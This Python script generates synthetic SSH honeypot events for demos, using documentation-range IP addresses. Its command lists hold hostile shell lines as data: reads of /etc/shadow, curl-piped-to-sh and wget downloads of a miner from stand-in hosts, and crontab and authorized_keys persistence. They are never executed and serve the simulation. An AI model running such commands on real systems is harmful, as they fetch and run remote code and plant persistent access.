"""Synthetic HoneyTrap events for local demos.

Addresses come from the RFC 5737 documentation ranges (203.0.113.0/24,
198.51.100.0/24, 192.0.2.0/24). Nothing in this file is a live indicator.
"""

from __future__ import annotations

import argparse
import json
import random
import time
import uuid
from datetime import UTC, datetime, timedelta
from pathlib import Path

DOCUMENTATION_IPS = [
    "203.0.113.10",
    "203.0.113.23",
    "203.0.113.44",
    "198.51.100.8",
    "198.51.100.17",
    "198.51.100.42",
    "192.0.2.15",
    "192.0.2.28",
    "192.0.2.64",
]

USERNAMES = ["root", "admin", "ubuntu", "pi", "oracle", "git", "test", "guest"]
PASSWORDS = ["admin", "admin123", "123456", "root", "password", "toor", "raspberry"]

RECON_COMMANDS = [
    "id",
    "whoami",
    "uname -a",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "ps aux",
    "hostname",
]
DOWNLOAD_COMMANDS = [
    "wget http://203.0.113.50/setup.sh -O /tmp/.x",
    "curl http://198.51.100.23/payload.sh | sh",
    "wget http://192.0.2.15/xmrig -O /tmp/.x && chmod +x /tmp/.x",
]
PERSISTENCE_COMMANDS = [
    "echo '* * * * * /tmp/.x' | crontab -",
    "mkdir -p ~/.ssh && echo 'ssh-rsa AAAA...example' >> ~/.ssh/authorized_keys",
]


class HoneypotEventGenerator:
    def __init__(self, honeypot_id: str = "ssh-01", honeypot_ip: str = "10.0.0.5") -> None:
        self.honeypot_id = honeypot_id
        self.honeypot_ip = honeypot_ip

    def _base(self, session_id: str, source_ip: str, category: str, when: datetime) -> dict:
        return {
            "id": str(uuid.uuid4()),
            "session_id": session_id,
            "timestamp": when.isoformat().replace("+00:00", "Z"),
            "protocol": "ssh",
            "category": category,
            "severity": "low" if category == "connection" else "medium",
            "source": {"ip": source_ip, "port": random.randint(40000, 65000)},
            "destination": {
                "ip": self.honeypot_ip,
                "port": 2222,
                "honeypot_id": self.honeypot_id,
            },
            "metadata": {},
            "tags": [],
        }

    def connection(self, session_id: str, source_ip: str, when: datetime) -> dict:
        event = self._base(session_id, source_ip, "connection", when)
        event["tags"] = ["connection_opened"]
        return event

    def auth(
        self,
        session_id: str,
        source_ip: str,
        when: datetime,
        username: str,
        password: str,
        success: bool,
    ) -> dict:
        event = self._base(session_id, source_ip, "authentication", when)
        event["severity"] = "high" if success else "medium"
        event["credentials"] = {
            "username": username,
            "password": password,
            "auth_method": "password",
            "success": success,
        }
        event["tags"] = ["password_auth"]
        return event

    def command(self, session_id: str, source_ip: str, when: datetime, command: str) -> dict:
        parts = command.split()
        event = self._base(session_id, source_ip, "command", when)
        risky = any(token in command for token in ("wget", "curl"))
        event["severity"] = "critical" if risky else "high"
        event["command"] = {
            "command": command,
            "command_name": parts[0] if parts else command,
            "arguments": parts[1:] or None,
            "working_directory": "/root",
        }
        event["tags"] = ["shell_command"]
        return event

    def scan(self, source_ip: str | None = None) -> list[dict]:
        source_ip = source_ip or random.choice(DOCUMENTATION_IPS)
        session_id = str(uuid.uuid4())
        start = datetime.now(UTC) - timedelta(minutes=random.randint(0, 30))
        return [
            self.connection(session_id, source_ip, start),
            self.auth(
                session_id,
                source_ip,
                start + timedelta(seconds=0.2),
                random.choice(USERNAMES[:3]),
                random.choice(PASSWORDS[:4]),
                False,
            ),
        ]

    def brute_force(self, source_ip: str | None = None) -> list[dict]:
        source_ip = source_ip or random.choice(DOCUMENTATION_IPS)
        session_id = str(uuid.uuid4())
        start = datetime.now(UTC) - timedelta(minutes=random.randint(0, 30))
        events = [self.connection(session_id, source_ip, start)]
        offset = 0.3
        for _ in range(random.randint(3, 6)):
            events.append(
                self.auth(
                    session_id,
                    source_ip,
                    start + timedelta(seconds=offset),
                    random.choice(USERNAMES),
                    random.choice(PASSWORDS),
                    False,
                )
            )
            offset += 0.4
        return events

    def compromise(self, source_ip: str | None = None) -> list[dict]:
        source_ip = source_ip or random.choice(DOCUMENTATION_IPS)
        session_id = str(uuid.uuid4())
        start = datetime.now(UTC) - timedelta(minutes=random.randint(0, 15))
        events = [
            self.connection(session_id, source_ip, start),
            self.auth(
                session_id,
                source_ip,
                start + timedelta(seconds=0.4),
                "root",
                "admin123",
                True,
            ),
        ]
        offset = 1.0
        commands = (
            random.sample(RECON_COMMANDS, k=3)
            + random.sample(DOWNLOAD_COMMANDS, k=1)
            + random.sample(PERSISTENCE_COMMANDS, k=1)
        )
        for command in commands:
            events.append(
                self.command(session_id, source_ip, start + timedelta(seconds=offset), command)
            )
            offset += 0.8
        return events


def generate_test_data(output_file: Path, num_sessions: int, mode: str, clear: bool) -> list[dict]:
    generator = HoneypotEventGenerator()
    builders = {
        "scans": generator.scan,
        "bruteforce": generator.brute_force,
        "compromise": generator.compromise,
    }
    events: list[dict] = []
    for _ in range(num_sessions):
        if mode == "mixed":
            roll = random.random()
            if roll < 0.6:
                batch = generator.scan()
            elif roll < 0.9:
                batch = generator.brute_force()
            else:
                batch = generator.compromise()
        else:
            batch = builders[mode]()
        events.extend(batch)
    events.sort(key=lambda event: event["timestamp"])
    mode_flag = "w" if clear else "a"
    with output_file.open(mode_flag, encoding="utf-8") as handle:
        for event in events:
            handle.write(json.dumps(event) + "\n")
    print(f"[+] Wrote {len(events)} events to {output_file}")
    return events


def stream_events(output_file: Path, interval: float) -> None:
    generator = HoneypotEventGenerator()
    print(f"[*] Streaming synthetic events to {output_file}")
    try:
        while True:
            roll = random.random()
            events = generator.scan() if roll < 0.7 else generator.brute_force()
            with output_file.open("a", encoding="utf-8") as handle:
                for event in events:
                    event["timestamp"] = datetime.now(UTC).isoformat().replace("+00:00", "Z")
                    handle.write(json.dumps(event) + "\n")
                    handle.flush()
                    print(f"{event['category']} from {event['source']['ip']}")
                    time.sleep(0.1)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("[*] Stopped")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Generate synthetic HoneyTrap events")
    parser.add_argument("-o", "--output", default="events.jsonl", help="Output JSONL path")
    parser.add_argument("-n", "--sessions", type=int, default=50, help="Number of sessions")
    parser.add_argument(
        "-m",
        "--mode",
        choices=["mixed", "scans", "bruteforce", "compromise"],
        default="mixed",
    )
    parser.add_argument("--stream", action="store_true", help="Append events until interrupted")
    parser.add_argument(
        "--interval",
        type=float,
        default=2.0,
        help="Pause between streamed sessions",
    )
    parser.add_argument("--clear", action="store_true", help="Truncate the output file first")
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    output = Path(args.output)
    if args.stream:
        stream_events(output, args.interval)
        return 0
    generate_test_data(output, args.sessions, args.mode, args.clear)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
